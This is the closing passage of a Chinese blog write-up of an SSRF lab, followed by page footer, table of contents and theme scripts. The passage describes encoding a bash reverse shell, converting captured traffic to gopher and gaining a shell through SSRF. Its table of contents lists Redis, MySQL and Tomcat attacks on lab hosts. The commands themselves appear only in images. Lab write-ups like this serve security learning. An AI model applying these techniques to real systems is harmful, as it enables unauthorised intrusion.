+<p>因为国光测试默认情况下弹不出来，所以这里将原始的 bash 反弹 shell 命令给编码了：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204701072416.png"><img src="../images/16204701072416.png" alt="img" /></a></p>
+<p>这个编码实际上就是 JS Base64 一下，国光我模仿国外的那个网站，自己写了个页面：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools.html">安全小公举 | 国光</a></p>
+<p>tcpdump 监听到的原始数据后，转换 gopher 协议，BP 二次编码请求一下，然后 SSRF 攻击成功弹出 shell：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20210508/16204703947056.png"><img src="../images/16204703947056.png" alt="img" /></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/bg1.jpg" data-sizes="auto" alt="ThinkPHP框架漏洞" class="lazyload">
+          
+        
+        <a href="/2026/03/03/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            ThinkPHP框架漏洞
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="记一次Kali崩溃退出图形化消失" class="lazyload">
+        
+      
+      <a href="/2026/03/01/%E8%AE%B0%E4%B8%80%E6%AC%A1Kali%E5%B4%A9%E6%BA%83%E9%80%80%E5%87%BA%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%B6%88%E5%A4%B1/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          记一次Kali崩溃退出图形化消失
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text"> 靶场环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168139141-%E5%85%A5%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text"> 192.168.139.141-入口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9ssrf%E6%8E%A2%E6%B5%8B%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 入口点SSRF探测内网信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002280-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text"> 192.168.100.22:80-代码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002380-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text"> 192.168.100.23:80-SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002480-ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cpost"><span class="toc-number">6.</span> <span class="toc-text"> 192.168.100.24:80-ping命令执行(POST)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E6%89%93%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text"> curl打法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E6%89%93%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text"> Gopher打法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1921681002580-xxe"><span class="toc-number">7.</span> <span class="toc-text"> 192.168.100.25:80-XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100268080-tomcat8519-cve-2017-12615"><span class="toc-number">8.</span> <span class="toc-text"> 192.168.100.26:8080-Tomcat&#x2F;8.5.19 CVE-2017-12615</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100276379-redis%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text"> 192.168.100.27:6379-Redis未授权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">9.1.</span> <span class="toc-text"> dict协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE%E6%89%93%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1getshell"><span class="toc-number">9.2.</span> <span class="toc-text"> dict协议打定时任务getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100286379-redis%E5%AF%86%E7%A0%81%E8%AE%A4%E8%AF%81"><span class="toc-number">10.</span> <span class="toc-text"> 192.168.100.28:6379-Redis密码认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#192168100293306-%E6%9C%AA%E6%8E%88%E6%9D%83mysql"><span class="toc-number">11.</span> <span class="toc-text"> 192.168.100.29:3306-未授权mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">11.1.</span> <span class="toc-text"> 获取原始数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90-gopher-%E6%95%B0%E6%8D%AE%E6%B5%81"><span class="toc-number">11.2.</span> <span class="toc-text"> 生成 gopher 数据流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E4%B9%8B-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">11.3.</span> <span class="toc-text"> SSRF 之 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E4%B9%8B-mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">11.4.</span> <span class="toc-text"> SSRF 之 MySQL 提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "国光SSRF打穿内网",
+          url: "http://example.com/2026/03/02/%E5%9B%BD%E5%85%89SSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/",
+          excerpt: "",
+          description: "",
+          stripContent: " 靶场环境 源码： https://github.com/sqlsec/ssrf-vuls  这里有168师傅的一键启动docker-compose.yml，直接docker-compose up -d即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364networks:  ssrf_v:    ipam:",
+          date: "Mon Mar 02 2026 16:40:51 GMT+0800",
+          updated: "Sun Mar 01 2026 23:32:23 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
